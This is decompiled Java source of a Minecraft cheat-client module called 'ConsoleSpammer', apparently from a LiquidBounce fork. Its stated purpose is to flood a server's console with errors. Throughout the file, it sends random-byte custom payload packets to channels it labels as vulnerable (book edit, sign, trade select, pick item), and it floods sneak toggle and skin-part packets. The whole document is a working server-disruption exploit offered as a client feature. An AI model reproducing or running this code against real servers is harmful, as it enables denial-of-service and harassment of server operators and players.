/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  net.minecraft.client.Minecraft
 *  net.minecraft.entity.Entity
 *  net.minecraft.entity.player.EnumPlayerModelParts
 *  net.minecraft.network.Packet
 *  net.minecraft.network.PacketBuffer
 *  net.minecraft.network.play.client.C0BPacketEntityAction
 *  net.minecraft.network.play.client.C0BPacketEntityAction$Action
 *  net.minecraft.network.play.client.C17PacketCustomPayload
 *  org.jetbrains.annotations.NotNull
 */
package net.ccbluex.liquidbounce.features.module.modules.fun;

import io.netty.buffer.Unpooled;
import kotlin.Metadata;
import kotlin.TypeCastException;
import kotlin.jvm.internal.Intrinsics;
import kotlin.random.Random;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.UpdateEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.IntegerValue;
import net.ccbluex.liquidbounce.value.ListValue;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EnumPlayerModelParts;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.jetbrains.annotations.NotNull;

@ModuleInfo(name="ConsoleSpammer", description="Spams the console of the server with errors.", category=ModuleCategory.FUN)
@Metadata(mv={1, 1, 16}, bv={1, 0, 3}, k=1, xi=2, d1={"\u0000B\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0011\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0010\u0010\u000f\u001a\u00020\u00102\u0006\u0010\u0011\u001a\u00020\u0012H\u0007J\u0010\u0010\u0013\u001a\u00020\u00102\u0006\u0010\u0011\u001a\u00020\u0014H\u0007R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\bX\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0016\u0010\u000b\u001a\b\u0012\u0004\u0012\u00020\r0\fX\u0082\u0004\u00a2\u0006\u0004\n\u0002\u0010\u000e\u00a8\u0006\u0015"}, d2={"Lnet/ccbluex/liquidbounce/features/module/modules/fun/ConsoleSpammer;", "Lnet/ccbluex/liquidbounce/features/module/Module;", "()V", "delayValue", "Lnet/ccbluex/liquidbounce/value/IntegerValue;", "modeValue", "Lnet/ccbluex/liquidbounce/value/ListValue;", "payload", "Lnet/minecraft/network/PacketBuffer;", "timer", "Lnet/ccbluex/liquidbounce/utils/timer/MSTimer;", "vulnerableChannels", "", "", "[Ljava/lang/String;", "onUpdate", "", "event", "Lnet/ccbluex/liquidbounce/event/UpdateEvent;", "onWorld", "Lnet/ccbluex/liquidbounce/event/WorldEvent;", "KyinoClient"})
public final class ConsoleSpammer
extends Module {
    private final ListValue modeValue = new ListValue("Mode", new String[]{"Payload", "MineSecure"}, "Payload");
    private final IntegerValue delayValue = new IntegerValue("Delay", 0, 0, 500);
    private final PacketBuffer payload = new PacketBuffer(Unpooled.buffer());
    private final String[] vulnerableChannels = new String[]{"MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem"};
    private final MSTimer timer = new MSTimer();

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    @EventTarget
    public final void onUpdate(@NotNull UpdateEvent event) {
        Intrinsics.checkParameterIsNotNull(event, "event");
        if (!this.timer.hasTimePassed(((Number)this.delayValue.get()).intValue())) {
            return;
        }
        String string = (String)this.modeValue.get();
        int n = 0;
        String string2 = string;
        if (string2 == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        String string3 = string2.toLowerCase();
        Intrinsics.checkExpressionValueIsNotNull(string3, "(this as java.lang.String).toLowerCase()");
        string = string3;
        switch (string.hashCode()) {
            case 518567306: {
                if (!string.equals("minesecure")) return;
                break;
            }
            case -786701938: {
                if (!string.equals("payload")) return;
                Minecraft minecraft = ConsoleSpammer.access$getMc$p$s1046033730();
                Intrinsics.checkExpressionValueIsNotNull(minecraft, "mc");
                minecraft.func_147114_u().func_147297_a((Packet)new C17PacketCustomPayload(this.vulnerableChannels[Random.Default.nextInt(this.vulnerableChannels.length)], this.payload));
                return;
            }
        }
        ConsoleSpammer.access$getMc$p$s1046033730().field_71474_y.func_178878_a(EnumPlayerModelParts.HAT, Random.Default.nextBoolean());
        ConsoleSpammer.access$getMc$p$s1046033730().field_71474_y.func_178878_a(EnumPlayerModelParts.JACKET, Random.Default.nextBoolean());
        ConsoleSpammer.access$getMc$p$s1046033730().field_71474_y.func_178878_a(EnumPlayerModelParts.LEFT_PANTS_LEG, Random.Default.nextBoolean());
        ConsoleSpammer.access$getMc$p$s1046033730().field_71474_y.func_178878_a(EnumPlayerModelParts.RIGHT_PANTS_LEG, Random.Default.nextBoolean());
        ConsoleSpammer.access$getMc$p$s1046033730().field_71474_y.func_178878_a(EnumPlayerModelParts.LEFT_SLEEVE, Random.Default.nextBoolean());
        ConsoleSpammer.access$getMc$p$s1046033730().field_71474_y.func_178878_a(EnumPlayerModelParts.RIGHT_SLEEVE, Random.Default.nextBoolean());
        n = 5;
        boolean bl = false;
        int n2 = 0;
        n2 = 0;
        int n3 = n;
        while (n2 < n3) {
            int it = n2++;
            boolean bl2 = false;
            Minecraft minecraft = ConsoleSpammer.access$getMc$p$s1046033730();
            Intrinsics.checkExpressionValueIsNotNull(minecraft, "mc");
            minecraft.func_147114_u().func_147297_a((Packet)new C0BPacketEntityAction((Entity)ConsoleSpammer.access$getMc$p$s1046033730().field_71439_g, C0BPacketEntityAction.Action.STOP_SNEAKING));
            Minecraft minecraft2 = ConsoleSpammer.access$getMc$p$s1046033730();
            Intrinsics.checkExpressionValueIsNotNull(minecraft2, "mc");
            minecraft2.func_147114_u().func_147297_a((Packet)new C0BPacketEntityAction((Entity)ConsoleSpammer.access$getMc$p$s1046033730().field_71439_g, C0BPacketEntityAction.Action.START_SNEAKING));
        }
        return;
    }

    @EventTarget
    public final void onWorld(@NotNull WorldEvent event) {
        Intrinsics.checkParameterIsNotNull(event, "event");
        if (event.getWorldClient() == null) {
            this.setState(false);
        }
    }

    public ConsoleSpammer() {
        byte[] rawPayload = new byte[Random.Default.nextInt(128)];
        Random.Default.nextBytes(rawPayload);
        this.payload.writeBytes(rawPayload);
    }

    public static final /* synthetic */ Minecraft access$getMc$p$s1046033730() {
        return MinecraftInstance.mc;
    }
}

